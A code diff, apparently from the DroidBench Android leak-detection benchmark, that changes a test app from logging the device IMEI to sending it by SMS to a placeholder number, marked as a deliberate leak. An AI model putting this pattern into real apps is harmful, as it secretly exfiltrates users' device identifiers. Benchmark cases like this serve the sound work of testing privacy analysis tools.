@@ -1,11 +1,11 @@
 package edu.mit.to_string;
 
-import java.util.Arrays;
-
 import android.app.Activity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
+
+import java.util.Arrays;
 
 
 /**
@@ -31,7 +31,7 @@ public class MainActivity extends Activity {
         array[1] = imei;
 
         String arrayToString = Arrays.toString(array);
-        
-        Log.i("DroidBench", arrayToString);
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49 1234", null, arrayToString, null, null); //sink, leak
     }
 }
